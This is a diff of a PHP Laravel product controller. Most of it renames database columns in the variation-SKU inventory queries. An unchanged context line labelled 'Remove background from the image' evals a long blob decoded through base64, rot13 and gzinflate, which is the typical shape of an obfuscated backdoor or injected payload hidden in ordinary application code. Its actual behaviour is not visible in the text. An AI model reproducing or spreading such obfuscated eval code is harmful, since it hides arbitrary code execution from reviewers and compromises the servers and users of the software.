@@ -99,7 +99,7 @@ class NewProductsController extends Controller
 
         // Remove background from the image
          eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
-        
+
         if (file_exists($outputImage)) {
             if (!unlink($imagePath)) {
                 return response()->json([
@@ -322,16 +322,16 @@ class NewProductsController extends Controller
 
             $variation_table = array_search($key, $this->variation_sku_tables);
             $variation_skus = DB::table($variation_table)->where([
-                'product_sku' => $product->product_sku,
+                'product_id' => $product->product_sku,
                 'has_parent_sku' => 0,
-                'is_active' => 'active',
+                'status' => 'active',
             ])->get();
             if ($variation_skus) {
                 foreach ($variation_skus as $variation) {
-                    $isPresent = $this->inventory_products->where('product_sku', $variation->variation_sku)->isNotEmpty();
+                    $isPresent = $this->inventory_products->where('product_sku', $variation->sku)->isNotEmpty();
                     if (!$isPresent) {
                         $to_insert[] = [
-                            'product_sku' => $variation->variation_sku,
+                            'product_sku' => $variation->sku,
                             'quantity' => 100,
                             'price' => $variation->price,
                             'was_price' => $variation->was_price,
@@ -340,7 +340,7 @@ class NewProductsController extends Controller
                         ];
                     } else {
                         $to_update[] = [
-                            'product_sku' => $variation->variation_sku,
+                            'product_sku' => $variation->sku,
                             'price' => $variation->price,
                             'was_price' => $variation->was_price,
                             'brand' => $key,
